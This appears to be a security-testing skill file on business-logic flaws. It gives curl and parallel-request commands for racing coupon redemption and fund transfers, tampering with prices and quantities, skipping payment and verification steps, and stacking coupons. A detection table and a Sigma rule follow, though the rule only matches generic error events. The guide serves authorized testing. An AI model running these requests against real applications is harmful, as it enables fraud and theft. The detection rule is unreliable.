---
name: performing-business-logic-testing
description: <!-- Copyright (c) 2026 defconxt. All rights reserved. -->
---

<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: performing-business-logic-testing
description: >-
  Test business logic for race conditions, price manipulation, workflow
  bypass, coupon abuse, quantity tampering, privilege escalation through
  business rules, and time-of-check-time-of-use (TOCTOU) vulnerabilities.
domain: cybersecurity
subdomain: application-security
tags:
  - business-logic
  - race-condition
  - price-tampering
  - workflow-bypass
  - owasp-a04
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1190", "T1499"]
  owasp-top10: ["A04"]
  tools: ["burp-suite", "turbo-intruder", "curl", "python3"]
---

# Performing Business Logic Testing

## Overview

Business logic vulnerabilities arise from flawed assumptions in application
workflows. Unlike technical vulnerabilities, they exploit legitimate
functionality in unintended ways — price manipulation, race conditions,
workflow bypass, and abuse of trust boundaries between features.

## Prerequisites

- Tools: ["burp-suite", "turbo-intruder", "curl", "python3"]
- Authorized testing engagement with written scope
- Target application access and credentials

## Workflow

### Step 1: Race Condition Testing

```bash
# Race condition with parallel requests (Burp Turbo Intruder)
# Or use GNU parallel:
seq 1 50 | parallel -j50 "curl -s -X POST https://target.com/api/redeem \
  -H 'Authorization: Bearer $TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"coupon":"DISCOUNT50"}' -o /dev/null -w '%{http_code}\n'"

# Race condition on fund transfer
seq 1 20 | parallel -j20 "curl -s -X POST https://target.com/api/transfer \
  -H 'Authorization: Bearer $TOKEN' \
  -d '{"to":"attacker","amount":100}' -o /dev/null -w '%{http_code}\n'"
```

### Step 2: Price and Quantity Manipulation

```bash
# Modify price in request
curl -s -X POST https://target.com/api/checkout \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"item_id":1,"quantity":1,"price":0.01}'

# Negative quantity
curl -s -X POST https://target.com/api/cart/add \
  -d '{"item_id":1,"quantity":-1}'

# Integer overflow
curl -s -X POST https://target.com/api/cart/add \
  -d '{"item_id":1,"quantity":2147483647}'
```

### Step 3: Workflow Bypass

```bash
# Skip payment step (direct access to confirmation)
curl -s -H "Authorization: Bearer $TOKEN" \
  https://target.com/api/order/confirm?order_id=123

# Bypass email verification
curl -s -X POST https://target.com/api/verify-email \
  -d '{"token":"","verified":true}'

# Skip multi-step process
# Step 1: /api/apply → Step 2: /api/verify → Step 3: /api/approve
# Try direct access to Step 3 without Steps 1-2
curl -s -X POST https://target.com/api/approve -d '{"application_id":123}'
```

### Step 4: Coupon and Discount Abuse

```bash
# Apply same coupon multiple times
for i in $(seq 1 10); do
  curl -s -X POST https://target.com/api/apply-coupon \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"coupon":"SAVE20","order_id":"ORD123"}' -o /dev/null -w "Attempt $i: %{http_code}\n"
done

# Stack multiple coupons
curl -s -X POST https://target.com/api/apply-coupon \
  -d '{"coupons":["SAVE20","SAVE30","WELCOME50"],"order_id":"ORD123"}'
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|-------------|
| Race condition | App logs | Duplicate transactions in short time window |
| Price tampering | Order system | Order total mismatch with catalog price |
| Workflow skip | Audit logs | State transition without prerequisite steps |
| Coupon abuse | Promotion system | Same coupon applied multiple times |

```yaml
title: Business Logic Testing Detection
id: a6bba561-c74c-4e88-8a0c-16b46f12613a
status: experimental
description: Detects suspicious activity related to performing business logic testing techniques in application security context
logsource:
  category: application
  product: webserver
detection:
  selection:
    EventType: error
  condition: selection
level: medium
tags:
  - attack.t1190
  - attack.t1499
  - attack.initial_access
falsepositives:
  - Application security scanning tools during CI/CD pipeline execution
```

## Verification

- [ ] All relevant attack vectors tested
- [ ] Findings documented with severity and evidence
- [ ] Detection artifacts identified
- [ ] Remediation recommendations provided

## References

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [MITRE ATT&CK](https://attack.mitre.org/)
